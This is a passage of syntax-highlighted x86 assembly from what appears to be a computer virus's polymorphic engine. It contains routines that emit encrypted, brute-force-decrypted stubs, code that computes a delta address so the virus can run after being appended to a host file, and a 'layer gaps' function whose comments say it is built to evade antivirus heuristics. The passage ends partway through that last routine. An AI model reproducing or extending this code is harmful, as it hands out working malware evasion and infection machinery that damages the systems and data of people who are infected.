        </span><span class="sc5">__pbi_nums</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;global numbers</span><span class="sc0">
        </span><span class="sc5">__pbi_last_num</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;last number</span><span class="sc0">
        </span><span class="sc5">__pbi_add_num</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;absolute number</span><span class="sc0">
        </span><span class="sc5">__pbi_start_crc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;startup checksum</span><span class="sc0">
        </span><span class="sc5">__pbi_last_crc</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;finishing checksum</span><span class="sc0">
        </span><span class="sc5">__pbi_regs</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;three registers</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_brute_init</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; change "poly_start" value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;new position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">;file_size + 3rd loop</span><span class="sc0">

        </span><span class="sc1">; generate four numbers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;four numbers</span><span class="sc0">
    </span><span class="sc5">__pbi_next_number</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">       </span><span class="sc1">;generate random number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_nums</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__pbi_next_number</span><span class="sc0">

        </span><span class="sc1">; calculate some checksums...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;counter</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;calculate register</span><span class="sc0">
    </span><span class="sc5">__pbi_calculate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_nums</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ACD78FA3h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;next number</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;ECX == numbers - 1 ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pbi_cfinish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_start_crc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;save that value</span><span class="sc0">
    </span><span class="sc5">__pbi_cfinish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pbi_calculate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_last_crc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;save checksum</span><span class="sc0">

        </span><span class="sc1">; generate three needed registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">       </span><span class="sc1">;three registers</span><span class="sc0">
    </span><span class="sc5">__pbi_next_register</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__pbi_next_register</span><span class="sc0">

        </span><span class="sc1">; generate old and new checksum</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">       </span><span class="sc1">;use old checksum it means</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_start_crc</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;without last right value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;the first register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">       </span><span class="sc1">;and use finishing crc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_last_crc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;the second register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;calculating register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;the third register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc1">; own algorithm</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;startup address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;old_reg++</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;mov calc_reg,old_reg</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;old reg</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">          </span><span class="sc1">;MOV instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C0D1h</span><span class="sc0">       </span><span class="sc1">;rol calc_reg,01h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F081h</span><span class="sc0">       </span><span class="sc1">;xor reg32,imm32</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ACD78FA3h</span><span class="sc0">      </span><span class="sc1">;special value</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ identification</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;"go back" offset</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;code register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_regs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">          </span><span class="sc1">;mov code_reg,reg32</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">       </span><span class="sc1">;sub code_reg,start_crc</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_start_crc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">       </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_add_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate code to get delta-address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function gets delta. Useful forr "g_repeat", and all</span><span class="sc0">
        </span><span class="sc1">;calls and jmps garbages, for all iluzo jumps and so on...</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ppe_gd_call</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_delta</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; prepare CALL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gd_call</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; now, we must active the global index register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;POP base-reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">    </span><span class="sc1">;'cause delta isn't finished</span><span class="sc0">

        </span><span class="sc1">; we must fix real address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gd_call</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; ADD or SUB ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gd_sub</span><span class="sc0">

        </span><span class="sc1">; fix with ADD --&gt; add reg32, fix_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gd_fix_done</span><span class="sc0">

        </span><span class="sc1">; fix with SUB --&gt; sub reg32, -fix_value</span><span class="sc0">
    </span><span class="sc5">__ppe_gd_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">__ppe_gd_fix_done</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate layer gaps (anti-heuristic) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function adds some gaps in multi-layers buffer. What</span><span class="sc0">
        </span><span class="sc1">;does it mean, gaps ? So, you will generate layers  map by</span><span class="sc0">
        </span><span class="sc1">;"ppe_mlayer_generate" function. There are only  movements</span><span class="sc0">
        </span><span class="sc1">;and AV can find that buffer and do all  alone, but here I</span><span class="sc0">
        </span><span class="sc1">;will generate some gaps,  and when  my poly find  certain</span><span class="sc0">
        </span><span class="sc1">;offset in that buffer, i'll add some value = anti-heuris-</span><span class="sc0">
        </span><span class="sc1">;tic. All is hiden by "ppe_crypt_value" as well.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Behaviour:</span><span class="sc0">
        </span><span class="sc1">;  * get number of gaps</span><span class="sc0">
        </span><span class="sc1">;  * generate their position and size in layer buffer</span><span class="sc0">
        </span><span class="sc1">;  * run "bubble sort" algorithm</span><span class="sc0">
        </span><span class="sc1">;  * do gaps in buffer (generate random movement)</span><span class="sc0">
        </span><span class="sc1">;  * change positions</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__pglg_num</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;number of gaps</span><span class="sc0">
        </span><span class="sc5">__pglg_where</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;gaps, their size</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_layer_gaps</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; negate all movements</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;number of movements</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_map</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__pglg_negate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">btc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">           </span><span class="sc1">;negate 7th bit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__pglg_negate</span><span class="sc0">

        </span><span class="sc1">; exchange all movements (from end 2 start)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_map</span><span class="sc4">]</span><span class="sc0">
